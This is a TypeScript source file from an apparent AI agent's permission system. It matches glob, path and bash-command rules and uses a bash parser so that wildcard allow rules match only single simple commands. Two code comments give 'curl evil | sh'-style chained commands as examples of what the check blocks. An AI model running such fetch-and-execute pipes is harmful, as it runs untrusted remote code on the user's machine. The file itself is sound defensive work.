/**
 * `tool` domain — permission rule-subject matching.
 *
 * Owns the glob / path matching primitives (`globMatch` / `pathGlobMatch`)
 * and the rule-subject helpers (`literalRulePattern`,
 * `escapeRuleSubjectLiteral`, `matchesGlobRuleSubject`,
 * `matchesPathRuleSubject`) that tool implementations use to build their
 * `matchesRule` closures and canonical rule strings. Path matching compares
 * normalized path variants, so `./a`, `dir/../a`, and Windows separator or
 * case variants can match the same rule. Pure functions; no scoped service.
 */

import { isAbsolute, join, parse } from 'pathe';

import picomatch from 'picomatch';

import { parse as parseBash, type SyntaxNode } from '@moonshot-ai/tree-sitter-bash';

import { canonicalizePath, type PathClass } from './path-access';

export interface PermissionPathMatchOptions {
  readonly cwd?: string;
  readonly pathClass?: PathClass;
  readonly homeDir?: string;
  readonly caseInsensitivePaths?: boolean;
}

interface PathMatchSemantics {
  readonly pathClass: PathClass;
}

export function globMatch(value: string, pattern: string, options?: { nocase?: boolean }): boolean {
  if (picomatch.isMatch(value, pattern, options)) return true;

  const normalizedValue = stripLeadingDotSlash(value);
  const normalizedPattern = stripLeadingDotSlash(pattern);
  if (normalizedValue === value && normalizedPattern === pattern) return false;
  return picomatch.isMatch(normalizedValue, normalizedPattern, options);
}

function stripLeadingDotSlash(value: string): string {
  return value.startsWith('./') ? value.slice(2) : value;
}

export function pathGlobMatch(
  value: string,
  pattern: string,
  pathOptions?: PermissionPathMatchOptions,
): boolean {
  const semantics = pathMatchSemantics(value, pattern, pathOptions);
  const nocase = pathOptions?.caseInsensitivePaths ?? true;

  if (globMatch(value, pattern, { nocase })) return true;

  for (const valueVariant of pathVariants(value, semantics, pathOptions)) {
    for (const patternVariant of pathVariants(pattern, semantics, pathOptions)) {
      if (globMatch(valueVariant, patternVariant, { nocase })) return true;
    }
  }
  return false;
}

function pathVariants(
  value: string,
  semantics: PathMatchSemantics,
  pathOptions: PermissionPathMatchOptions | undefined,
): string[] {
  const variants = new Set<string>();
  addPathVariant(variants, value, semantics.pathClass);
  addPathVariant(variants, stripLeadingDotPath(value, semantics.pathClass), semantics.pathClass);

  const canonical = canonicalizePathPattern(value, semantics, pathOptions);
  if (canonical !== undefined) addPathVariant(variants, canonical, semantics.pathClass);
  return Array.from(variants);
}

function canonicalizePathPattern(
  value: string,
  semantics: PathMatchSemantics,
  pathOptions: PermissionPathMatchOptions | undefined,
): string | undefined {
  const expanded = expandUserPath(value, semantics.pathClass, pathOptions?.homeDir);
  const cwd = pathOptions?.cwd ?? defaultCwdForPath(expanded);
  if (cwd === undefined) return undefined;
  try {
    return canonicalizePath(expanded, cwd, semantics.pathClass);
  } catch {
    return undefined;
  }
}

function expandUserPath(
  value: string,
  pathClass: PathClass,
  homeDir: string | undefined,
): string {
  if (homeDir === undefined) return value;
  if (value === '~') return homeDir;
  if (value.startsWith('~/') || (pathClass === 'win32' && value.startsWith('~\\'))) {
    return join(homeDir, value.slice(2));
  }
  return value;
}

function defaultCwdForPath(value: string): string | undefined {
  if (!isAbsolute(value)) return undefined;
  return parse(value).root;
}

function pathMatchSemantics(
  value: string,
  pattern: string,
  pathOptions: PermissionPathMatchOptions | undefined,
): PathMatchSemantics {
  const pathClass =
    pathOptions?.pathClass ??
    ([value, pattern].some((candidate) => {
      return (
        /^[A-Za-z]:(?:[\\/]|$)/.test(candidate) ||
        candidate.startsWith('\\\\') ||
        candidate.includes('\\')
      );
    })
      ? 'win32'
      : 'posix');
  return { pathClass };
}

function addPathVariant(variants: Set<string>, value: string, pathClass: PathClass): void {
  variants.add(value);
  if (pathClass === 'win32') variants.add(value.replaceAll('\\', '/'));
}

function stripLeadingDotPath(value: string, pathClass: PathClass): string {
  if (value.startsWith('./')) return value.slice(2);
  if (pathClass === 'win32' && value.startsWith('.\\')) return value.slice(2);
  return value;
}

const GLOB_LITERAL_SPECIAL = /[\\*?[\]{}()!+@|]/g;

export function literalRulePattern(toolName: string, subject: string): string {
  return `${toolName}(${escapeRuleSubjectLiteral(subject)})`;
}

export function escapeRuleSubjectLiteral(subject: string): string {
  return subject.replace(GLOB_LITERAL_SPECIAL, '\\$&');
}

export function matchesGlobRuleSubject(ruleArgs: string, subject: string): boolean {
  return matchRuleSubjects(ruleArgs, [subject], (pattern, value) => globMatch(value, pattern));
}


/**
 * Budget for the permission-path parse. Small on purpose: this runs on the hot
 * path of every rule check, and a command that cannot be parsed inside it is
 * treated as un-analyzable (and therefore not eligible for a wildcard match).
 */
const BASH_RULE_PARSE_OPTIONS = { timeoutMs: 50, maxNodes: 20_000 } as const;

function countCommands(node: SyntaxNode): number {
  let total = node.type === 'command' ? 1 : 0;
  for (const child of node.namedChildren) total += countCommands(child);
  return total;
}

/**
 * Whether `command` is a single simple command rather than a compound one.
 *
 * Uses the bash parser rather than scanning for metacharacters, because the
 * two disagree exactly where it matters: `git commit -m "a; b"` is one command
 * (the `;` is inside a string), while `git status; curl x | sh` is three.
 *
 * Anything the parser cannot analyze — budget exhausted, or a tree with
 * errors — is reported as not-simple, so an unparseable command degrades to
 * "needs approval" instead of slipping through a wildcard rule.
 */
export function isSingleSimpleCommand(command: string): boolean {
  const parsed = parseBash(command, BASH_RULE_PARSE_OPTIONS);
  if (!parsed.ok || parsed.hasError) return false;
  return countCommands(parsed.rootNode) === 1;
}

/**
 * Rule matching for shell commands.
 *
 * A wildcard rule describes a shape of command the user is comfortable with;
 * it should not also authorize whatever got chained onto it. `Bash(git *)`
 * matching `git status; curl evil | sh` would turn a narrow grant into an
 * arbitrary one, so a permissive (allow) rule only matches when the command is
 * a single simple command.
 *
 * Two cases stay untouched: an exact-literal rule (what "approve for this
 * session" stores) still matches the command it was created from, compound or
 * not; and non-permissive rules (deny / ask) match exactly as before, so this
 * never weakens a block.
 */
export function matchesBashCommandRuleSubject(
  ruleArgs: string,
  command: string,
  options?: { readonly permissive?: boolean },
): boolean {
  if (!matchesGlobRuleSubject(ruleArgs, command)) return false;
  if (options?.permissive !== true) return true;
  if (ruleArgs === command) return true;
  return isSingleSimpleCommand(command);
}

export function matchesPathRuleSubject(
  ruleArgs: string,
  subject: string,
  options?: PermissionPathMatchOptions,
): boolean {
  return matchRuleSubjects(ruleArgs, [subject], (pattern, value) =>
    pathGlobMatch(value, pattern, options),
  );
}

function matchRuleSubjects(
  ruleArgs: string,
  subjects: readonly string[],
  matchesPositivePattern: (pattern: string, subject: string) => boolean,
): boolean {
  if (ruleArgs.length === 0) return true;
  const negated = ruleArgs.startsWith('!');
  const positivePattern = negated ? ruleArgs.slice(1) : ruleArgs;
  const hit = subjects.some((subject) => matchesPositivePattern(positivePattern, subject));
  return negated ? !hit : hit;
}
